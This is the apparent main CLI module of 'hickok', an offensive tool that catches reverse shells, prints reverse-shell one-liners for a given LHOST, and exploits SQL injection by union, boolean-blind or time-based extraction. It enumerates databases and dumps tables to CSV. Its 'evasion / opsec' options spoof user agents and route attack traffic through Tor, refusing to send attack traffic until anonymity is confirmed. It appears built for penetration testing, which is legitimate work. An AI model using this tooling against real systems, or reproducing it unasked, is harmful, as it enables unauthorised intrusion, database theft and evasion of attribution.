"""hickok — reverse-shell handler & post-exploitation console."""

from __future__ import annotations

import argparse
import asyncio
import json
import os
import re
import sys
from pathlib import Path
from urllib.parse import parse_qs, urlsplit

from hickok import __version__, findings, http, payloads, sqlcache, sqli
from hickok.console import DIM, THEMES, Console
from hickok.handler import ShellServer
from hickok.showdown import Showdown

EXAMPLES = """\
examples:
  hickok                                 listen on :9001 and drop into the console
  hickok -l 9001,9002 --lhost 10.10.14.7 multiple listeners, fixed LHOST
  hickok call                            act on wraith's latest run (found on its own)
  hickok payloads 10.10.14.7 9001        print reverse-shell one-liners
"""

# A lean tutorial for the bare command — the full help lives behind -h.
_QUICKSTART = [
    ("hickok -l 9001", "catch reverse shells"),
    ("hickok call", "act on wraith's latest run"),
    ("hickok sql -u URL -p id", "walk a SQL injection"),
    ("hickok hand", "lay down the dead man's hand"),
]


def _quickstart(c: "Console") -> None:
    """Banner + a few example commands (run `hickok -h` for the full help)."""
    c.banner()
    for cmd, desc in _QUICKSTART:
        c.plain("  " + c._accent(cmd.ljust(26)) + c._c(DIM, desc))
    c.plain("")
    c.plain("  " + c._c(DIM, "hickok -h  ·  full help, every command and option"))


_COMMANDS = {"listen", "hand", "call", "showdown", "payloads", "eights", "sql"}

# `hickok showdown` flips a mode that sticks between runs, so it's persisted here.
_CONFIG_PATH = Path(os.environ.get("XDG_CONFIG_HOME", Path.home() / ".config")) / "hickok" / "config.json"


def _load_config() -> dict:
    try:
        return json.loads(_CONFIG_PATH.read_text(encoding="utf-8"))
    except (OSError, ValueError):
        return {}


def _save_config(cfg: dict) -> None:
    try:
        _CONFIG_PATH.parent.mkdir(parents=True, exist_ok=True)
        _CONFIG_PATH.write_text(json.dumps(cfg, indent=2), encoding="utf-8")
    except OSError:
        pass


class _Help(argparse.RawDescriptionHelpFormatter):
    def __init__(self, prog):
        super().__init__(prog, max_help_position=28, width=86)


def _with_default_command(argv):
    """`hickok` / `hickok -l 9001` default to the `listen` handler."""
    out = list(argv)
    i = 0
    while i < len(out):
        tok = out[i]
        if tok in ("-h", "--help", "--version"):
            return out
        if tok == "--theme":
            i += 2
            continue
        if tok in ("--no-color", "--no-banner"):
            i += 1
            continue
        if tok not in _COMMANDS:
            out.insert(i, "listen")
        return out
    return out


def _console(args) -> Console:
    c = Console(
        theme=getattr(args, "theme", None),
        color=False if getattr(args, "no_color", False) else None,
        banner=not getattr(args, "no_banner", False),
        verbose=getattr(args, "verbose", 0),
    )
    if _load_config().get("showdown"):       # mode on → wire it to the console
        c.showdown = Showdown(c)
    return c


def cmd_listen(args) -> None:
    c = _console(args)
    c.banner()
    try:
        ports = [int(p) for p in args.listen.split(",")]
    except ValueError:
        raise SystemExit("--listen expects comma-separated port numbers")
    lhost = args.lhost or payloads.guess_lhost()
    server = ShellServer(ports, lhost, c)
    asyncio.run(server.run())


def cmd_payloads(args) -> None:
    c = _console(args)
    lhost = args.lhost or payloads.guess_lhost()
    c.info(f"reverse shells for {lhost}:{args.lport}")
    for name, p in payloads.generate(lhost, args.lport).items():
        c.plain(f"\n  # {name}\n  {p}")
    c.plain("")


def cmd_hand(args) -> None:
    """Lay down the dead man's hand — the gunslinger and his cards."""
    _console(args).hand()


def cmd_call(args) -> None:
    c = _console(args)
    c.banner()
    path = args.file or findings.latest()
    if not path:
        c.bad(f"no wraith run found in {findings.runs_dir()} — run wraith first, "
              "or pass a findings.json (`hickok call <file>`)")
        raise SystemExit(1)
    if not args.file:
        c.info(f"reading {path}")
    try:
        items = findings.load(path)
    except (OSError, ValueError) as exc:
        c.bad(f"cannot read findings: {exc}")
        raise SystemExit(1)

    c.info(f"{len(items)} finding(s) dealt by wraith")
    c.rule("the table")
    for f in items:
        sev, title, target = f.get("severity", "?"), f.get("title", ""), f.get("target", "")
        mark = c._accent("  ⮕ shell") if findings.is_foothold(title) else ""
        c.plain(f"  [{sev}] {title}  {c._c(DIM, target)}{mark}")

    foot = findings.footholds(items)
    if foot:
        c.good(f"{len(foot)} foothold(s) — code execution. catch a shell off one:")
        c.plain("      hickok -l 9001          # listener in one terminal")
        for f in foot:
            c.plain(f"      → {f.get('target', '')}")
    else:
        c.warn("no code-execution foothold here — these are leads, not a shell (yet)")


def cmd_showdown(args) -> None:
    """Toggle showdown mode on/off — it sticks between runs. While on, the moment
    a reverse shell lands hickok plays the catch out: the gunslinger, the dead
    man's hand, the call."""
    c = _console(args)
    cfg = _load_config()
    cfg["showdown"] = not cfg.get("showdown", False)
    _save_config(cfg)
    if cfg["showdown"]:
        if c.show_banner:
            c.hand()
        c.good("showdown mode ON — landing a shell now plays the catch out "
               "(run `hickok showdown` again to turn off)")
    else:
        c.info("showdown mode OFF — hickok runs plain again")


def cmd_eights(args) -> None:
    _console(args).eights()


_SQL_HELP = """  walk the database (boolean-blind):
  banner                DBMS version       user / db        current user / database
  databases             list databases     tables           list tables
  columns <table>       a table's columns  dump <table>     dump its rows
  query "<SELECT>"      extract one value  help / exit      this / quit
"""


def _sqli_target(items):
    """Pull (url, param) from a wraith SQL-injection finding, if any."""
    for f in items:
        title = (f.get("title") or "")
        if "sql injection" in title.lower():
            m = re.search(r"in '([^']+)'", title)
            if m and f.get("target"):
                return f["target"], m.group(1)
    return None, None


def cmd_sql(args) -> None:
    c = _console(args)
    c.banner()

    if args.check_tor:                          # verify anonymity setup and exit
        try:
            net = http.Http(proxy=args.proxy, tor=args.tor, timeout=args.timeout)
        except http.TorError as exc:
            c.bad(str(exc))
            raise SystemExit(2)
        c.info("checking the exit…")
        if net.check_tor():
            c.good("confirmed — traffic exits through Tor, you're anonymised")
        else:
            c.bad("NOT going through Tor — start the daemon (port 9050) and use "
                  "--tor, or run via `torsocks`")
        return

    url, param, value = args.url, args.param, args.value
    if not url:                                  # fall back to wraith's latest run
        path = findings.latest()
        items = findings.load(path) if path else []
        t, p = _sqli_target(items)
        if t:
            url, param = t, (param or p)
            c.info(f"target from wraith: {p} @ {t}")
    if not url:
        c.bad("need a target — `hickok sql -u 'http://host/page?id=1' [-p id]`")
        raise SystemExit(2)

    q = parse_qs(urlsplit(url).query)
    if not param:
        if len(q) == 1:
            param = next(iter(q))
        else:
            c.bad("which parameter? add `-p <name>`")
            raise SystemExit(2)
    if param in q and args.value == "1":         # take the URL's own value unless overridden
        value = q[param][0]

    # Build the HTTP sender with the operational options (UA, proxy/Tor, …).
    headers = {}
    for h in (args.header or []):
        name, _, val = h.partition(":")
        if val:
            headers[name.strip()] = val.strip()
    ua = args.user_agent or (http.random_agent() if args.random_agent else None)
    try:
        net = http.Http(ua=ua, headers=headers, cookie=args.cookie, proxy=args.proxy,
                        tor=args.tor, delay=args.delay, timeout=args.timeout)
    except http.TorError as exc:
        c.bad(str(exc))
        raise SystemExit(2)

    if args.tor or args.proxy:
        c.info(f"routing through {'Tor' if args.tor else args.proxy}")
    if args.tor:                               # fail closed: never attack if Tor isn't confirmed
        c.info("verifying Tor exit…")
        if not net.check_tor():
            c.bad("Tor not confirmed — aborting before sending attack traffic")
            raise SystemExit(2)
        c.good("Tor confirmed — anonymised")

    p = urlsplit(url)
    c.info(f"injecting '{param}' at {p.scheme}://{p.netloc}{p.path}")

    # Pick a technique: union (whole values per request — fast) when output is
    # reflected, else boolean-blind (a char at a time), else time-based (a
    # delayed request per bit — works when nothing leaks at all).
    oracle, union = None, None
    if args.technique != "time":
        c.info("calibrating boolean-blind oracle…")
        with c.working("calibrating the oracle", lambda: net.count):
            oracle = sqli.calibrate(net, url, param, value, console=c)

    if oracle is not None:
        c.good(f"injectable — {oracle.context} context")
        with c.working("fingerprinting the DBMS", lambda: net.count):
            dbms = sqli.fingerprint(oracle)
        if args.technique in ("auto", "union"):
            with c.working("probing for a UNION", lambda: net.count):
                setup = sqli.union_setup(net, oracle, dbms)
            if setup:
                union = (dbms, *setup)
                c.good(f"union-based — {setup[0]} columns, output reflected (fast)")
            elif args.technique == "union":
                c.bad("no usable UNION here (no reflected column) — try --technique blind")
                raise SystemExit(1)
        if union is None:
            c.info("boolean-blind extraction (a request per bit — slower)")
    elif args.technique in ("auto", "time"):
        c.info("no boolean differential — calibrating time-based oracle…")
        with c.working("calibrating time-based", lambda: net.count):
            oracle = sqli.time_calibrate(net, url, param, value, console=c)
        if oracle is None:
            c.bad("no injection found here (boolean, union, or time)")
            raise SystemExit(1)
        dbms = oracle.dbms
        c.good(f"time-based — {oracle.n}s per true bit (slow but works on the blind)")
    else:
        c.bad("no boolean-blind injection here — try another parameter or value")
        raise SystemExit(1)

    prof = sqli._PROFILES.get(dbms, sqli._PROFILES["sqlite"])
    c.good(f"DBMS: {dbms}")

    # Per-target cache: skip anything pulled before, resume after a Ctrl-C.
    oracle.cache = sqlcache.Cache(url, param, fresh=args.fresh)
    if len(oracle.cache):
        c.info(f"resuming — {len(oracle.cache)} value(s) cached from a previous run")

    # Non-interactive (batch) one-shots, else the interactive console.
    try:
        if args.banner:
            with c.working("reading the banner", lambda: oracle.count):
                out = _walk_banner(oracle, prof, union)
            c.good(out)
        elif args.tables:
            with c.working("listing tables", lambda: oracle.count):
                tbls = _tables(c, oracle, prof, union)           # extract inside the spinner
            for t in tbls:
                c.plain(f"  {t}")
        elif args.dump:
            with c.working(f"dumping {args.dump}", lambda: oracle.count):
                cols, rows = _walk_dump(oracle, prof, union, args.dump, console=c)
                rows = list(rows)                                # extract inside the spinner
            _print_table(c, cols, rows)
            _save_dump(c, oracle, args.dump, cols, rows, args.output)
        else:
            with c.working("reading the databases", lambda: oracle.count):
                _overview(c, oracle, prof, union)    # exploration context — REPL only
            _sql_repl(c, oracle, prof, union, args.output)
    finally:
        oracle.cache.close()


# Technique-agnostic walkers: use UNION when available, else boolean-blind.
def _walk_banner(oracle, prof, union):
    if union:
        return sqli.union_value(oracle.http, oracle, *union, sqli._PROFILES[union[0]]["version"])
    return sqli.extract_str(oracle, prof, prof["version"])


def _walk_scalar(oracle, prof, union, expr):
    if union:
        return sqli.union_value(oracle.http, oracle, *union, expr)
    return sqli.extract_str(oracle, prof, expr)


def _databases(oracle, prof, union):
    if union:
        return sqli.union_databases(oracle.http, oracle, *union)
    return sqli.databases(oracle, prof)


def _overview(c, oracle, prof, union) -> None:
    """Right under the DBMS: the current database, and the others when the catalog
    is reachable — a starting point for where to dig."""
    try:
        cur = (_walk_scalar(oracle, prof, union, prof["db"]) or "").strip()
    except Exception:
        cur = ""
    dbs = []
    if union:                       # cheap (one request) — only auto-list when reflected
        try:
            dbs = [d for d in _databases(oracle, prof, union) if d]
        except Exception:
            dbs = []
    if dbs:
        shown = ", ".join(f"{d} *" if d == cur else d for d in dbs)
        tail = "    (* current)" if cur in dbs else ""
        c.good(f"databases ({len(dbs)}): {shown}{tail}")
    elif cur:
        c.good(f"database: {cur}")


def _walk_tables(oracle, prof, union):
    if union:
        return sqli.union_tables(oracle.http, oracle, *union)
    return sqli.tables(oracle, prof)


def _tables(c, oracle, prof, union):
    """Tables via the catalog; if that's blocked/empty on a blind walk, fall back
    to guessing common names (no information_schema needed)."""
    tbls = list(_walk_tables(oracle, prof, union))
    if tbls:
        return tbls
    blocked = getattr(oracle, "blocked", 0)
    if blocked:
        c.warn(f"the catalog (information_schema) looks filtered — {blocked} anomalous "
               "response(s); falling back to common table names")
    else:
        c.info("catalog returned nothing — trying common table names")
    db = None
    try:                                    # the db name lets us also try <db>_<name>
        db = (_walk_scalar(oracle, prof, union, prof["db"]) or "").strip() or None
    except Exception:
        pass
    if db:
        c.info(f"guessing names against the '{db}' database (and <db>_* conventions)")
    tbls = list(sqli.common_tables(oracle, db=db))
    if tbls:
        c.good(f"{len(tbls)} table(s) found by name (information_schema bypassed)")
    else:
        c.warn("no common table names matched — try `query` with a name you expect")
    return tbls


def _walk_columns(oracle, prof, union, table):
    if union:
        return sqli.union_columns(oracle.http, oracle, *union, table)
    return sqli.columns(oracle, prof, table)


def _columns(c, oracle, prof, union, table):
    cols = list(_walk_columns(oracle, prof, union, table))
    if cols:
        return cols
    if getattr(oracle, "blocked", 0):
        c.warn(f"columns of {table} via information_schema look filtered — guessing common names")
    cols = list(sqli.common_columns(oracle, table))
    if cols:
        c.good(f"{len(cols)} column(s) found by name")
    return cols


def _walk_dump(oracle, prof, union, table, console=None):
    cols = (_columns(console, oracle, prof, union, table) if console
            else list(_walk_columns(oracle, prof, union, table)))   # full list — reused per row
    if union:
        rows = sqli.union_dump(oracle.http, oracle, *union, table, cols)
    else:
        rows = sqli.dump(oracle, prof, table, cols)          # a generator (lazy rows)
    return cols, rows


def _save_dump(c, oracle, table, cols, rows, out_dir=None) -> None:
    """Persist a dump to CSV and tell the user where — so the data survives the
    session instead of only scrolling past in the terminal."""
    if not rows:
        return
    path = sqlcache.save_dump(oracle.url, oracle.param, table, cols, rows, out_dir)
    if path:
        c.good(f"{len(rows)} row(s) saved → {path}")
    else:
        c.warn(f"couldn't write the dump to {out_dir or sqlcache.runs_dir()}")


def _print_table(c, cols, rows) -> None:
    def cell(r, i):                       # a row can be short/long if a value held a
        return r[i] if i < len(r) else ""  # column separator — never index out of range
    widths = [max([len(cols[i])] + [len(cell(r, i)) for r in rows]) for i in range(len(cols))]
    c.plain("  " + c._c(DIM, " | ".join(h.ljust(widths[i]) for i, h in enumerate(cols))))
    c.plain("  " + c._c(DIM, "-+-".join("-" * w for w in widths)))
    for r in rows:
        c.plain("  " + " | ".join(cell(r, i).ljust(widths[i]) for i in range(len(cols))))


def _sql_repl(c, oracle, prof, union, out_dir=None) -> None:
    c.plain(_SQL_HELP)
    while True:
        try:
            line = input("hickok(sql)> ").strip()
        except (EOFError, KeyboardInterrupt):
            c.plain("")
            break
        if not line:
            continue
        cmd, _, arg = line.partition(" ")
        cmd, arg = cmd.lower(), arg.strip()
        before = oracle.count
        spin = c.working("working the database", lambda: oracle.count)
        spin.__enter__()                         # heartbeat during the walk (not the prompt)
        try:
            if cmd in ("exit", "quit"):
                break
            elif cmd in ("help", "?"):
                c.plain(_SQL_HELP)
                continue
            elif cmd == "banner":
                c.good(_walk_banner(oracle, prof, union))
            elif cmd in ("user", "current-user"):
                c.good(_walk_scalar(oracle, prof, union, prof["user"]) or "(n/a)")
            elif cmd in ("db", "current-db"):
                c.good(_walk_scalar(oracle, prof, union, prof["db"]) or "(n/a)")
            elif cmd in ("databases", "dbs"):
                dbs = [d for d in _databases(oracle, prof, union) if d]
                if dbs:
                    for d in dbs:
                        c.plain(f"  {d}")
                else:                       # catalog filtered — show at least the current one
                    c.good(_walk_scalar(oracle, prof, union, prof["db"]) or "(n/a)")
            elif cmd == "tables":
                for t in _tables(c, oracle, prof, union):
                    c.plain(f"  {t}")
            elif cmd == "columns":
                if not arg:
                    c.warn("usage: columns <table>")
                    continue
                for col in _columns(c, oracle, prof, union, arg):
                    c.plain(f"  {col}")
            elif cmd == "dump":
                if not arg:
                    c.warn("usage: dump <table>")
                    continue
                cols, rowgen = _walk_dump(oracle, prof, union, arg, console=c)
                rows = []
                try:
                    for r in rowgen:
                        rows.append(r)
                finally:
                    _print_table(c, cols, rows)   # show whatever we pulled, even on interrupt
                    _save_dump(c, oracle, arg, cols, rows, out_dir)
            elif cmd == "query":
                if not arg:
                    c.warn('usage: query "<SELECT returning one value>"')
                    continue
                if len(arg) >= 2 and arg[0] == arg[-1] and arg[0] in "\"'":
                    arg = arg[1:-1]            # peel one wrapping quote, keep inner ones
                c.good(_walk_scalar(oracle, prof, union, arg))
            else:
                c.warn(f"unknown command: {cmd} (type 'help')")
        except KeyboardInterrupt:
            c.warn("interrupted — keeping what was pulled so far")
        except Exception as exc:
            c.bad(f"error: {exc}")
        finally:
            spin.__exit__(None, None, None)
        c.plain(c._c(DIM, f"      {oracle.count - before} requests · {oracle.count} total"))



def _output_options() -> argparse.ArgumentParser:
    """Cosmetic options every command understands, shared via parents= so they
    work in any position (`hickok call f.json --no-color`, not only before it)."""
    op = argparse.ArgumentParser(add_help=False)
    op.add_argument("--theme", metavar="NAME", choices=list(THEMES),
                    help="colour theme: " + " | ".join(THEMES) + " (default: ember)")
    op.add_argument("--no-color", action="store_true", help="disable coloured output")
    op.add_argument("--no-banner", action="store_true", help="suppress the banner")
    return op


def build_parser() -> argparse.ArgumentParser:
    common = _output_options()
    p = argparse.ArgumentParser(
        prog="hickok",
        description="Reverse-shell handler & post-exploitation. The listener is the default: "
                    "`hickok -l PORTS`.",
        epilog=EXAMPLES,
        formatter_class=_Help,
        parents=[common],
    )
    p.add_argument("--version", action="version", version=f"hickok {__version__}")
    sub = p.add_subparsers(dest="command", metavar="<command>")

    ln = sub.add_parser("listen", help="catch reverse shells (default command)",
                        formatter_class=_Help, epilog=EXAMPLES, parents=[common])
    ln.add_argument("-l", "--listen", metavar="PORTS", default="9001",
                    help="comma-separated ports to listen on (default: 9001)")
    ln.add_argument("--lhost", metavar="IP", help="LHOST embedded in generated payloads (auto-detected)")
    ln.set_defaults(func=cmd_listen)

    cl = sub.add_parser("call", help="act on a wraith run — flag the footholds",
                        formatter_class=_Help, parents=[common])
    cl.add_argument("file", nargs="?",
                    help="path to a wraith findings.json (default: wraith's latest run, $WRAITH_RUNS-aware)")
    cl.set_defaults(func=cmd_call)

    hd = sub.add_parser("hand", help="lay down the dead man's hand",
                        formatter_class=_Help, parents=[common])
    hd.set_defaults(func=cmd_hand)

    sd = sub.add_parser("showdown", help="toggle showdown mode on/off (sticks between runs)",
                        formatter_class=_Help, parents=[common],
                        description="Toggle showdown mode. While it's on, `hickok call` plays the "
                                    "catch out: the gunslinger, the dead man's hand, the verdict.")
    sd.set_defaults(func=cmd_showdown)

    sq = sub.add_parser("sql", help="walk a SQL-injectable parameter (boolean-blind)",
                        formatter_class=_Help, parents=[common])
    sq.add_argument("-u", "--url", help="target URL (default: wraith's latest SQLi finding)")
    sq.add_argument("-p", "--param", help="injectable parameter (inferred if the URL has just one)")
    sq.add_argument("--value", metavar="V", default="1", help="a normal value for the parameter (default: 1)")
    sq.add_argument("--technique", choices=["auto", "union", "blind", "time"], default="auto",
                    help="auto (union>blind>time) · union · blind · time")
    sq.add_argument("-v", "--verbose", nargs="?", const=1, type=int, default=0, metavar="LEVEL",
                    help="-v 2 prints every injected payload")
    sq.add_argument("--fresh", action="store_true",
                    help="ignore the cached values for this target and re-extract from scratch")
    sq.add_argument("-o", "--output", metavar="DIR",
                    help="directory to write dumped CSVs to (default: ~/.local/share/hickok/sql/dumps)")
    ev = sq.add_argument_group("evasion / opsec")
    ev.add_argument("--random-agent", action="store_true", help="use a random real browser User-Agent")
    ev.add_argument("-A", "--user-agent", metavar="UA", help="explicit User-Agent")
    ev.add_argument("-H", "--header", action="append", metavar="'K: V'", help="extra header (repeatable)")
    ev.add_argument("--cookie", metavar="STR", help="Cookie header (for authenticated injection)")
    ev.add_argument("--proxy", metavar="URL", help="http://host:port or socks5h://host:port")
    ev.add_argument("--tor", action="store_true",
                    help="route via Tor (socks5h://127.0.0.1:9050), verified — fails closed")
    ev.add_argument("--check-tor", action="store_true",
                    help="just verify Tor/proxy is anonymising you, then exit")
    ev.add_argument("--delay", metavar="SEC", type=float, default=0.0, help="seconds between requests")
    ev.add_argument("--timeout", metavar="SEC", type=float, default=15.0, help="per-request timeout")
    bt = sq.add_argument_group("non-interactive (run one action and exit)")
    bt.add_argument("--banner", action="store_true", help="print the DBMS version")
    bt.add_argument("--tables", action="store_true", help="list tables")
    bt.add_argument("--dump", metavar="TABLE", help="dump a table")
    sq.set_defaults(func=cmd_sql)

    pl = sub.add_parser("payloads", help="print reverse-shell one-liners",
                        formatter_class=_Help, parents=[common])
    pl.add_argument("lhost", nargs="?", help="LHOST (auto-detected if omitted)")
    pl.add_argument("lport", nargs="?", type=int, default=9001, help="LPORT (default: 9001)")
    pl.set_defaults(func=cmd_payloads)

    egg = sub.add_parser("eights", parents=[common])   # easter egg: no help= keeps it out
    egg.set_defaults(func=cmd_eights)
    return p


def main(argv=None) -> None:
    argv = sys.argv[1:] if argv is None else list(argv)
    parser = build_parser()
    if not argv:
        _quickstart(Console())
        return
    args = parser.parse_args(_with_default_command(argv))
    if not hasattr(args, "func"):
        _quickstart(_console(args))
        return
    try:
        args.func(args)
    except KeyboardInterrupt:
        print("\n  [-] interrupted", file=sys.stderr)
        sys.exit(130)


if __name__ == "__main__":
    main()
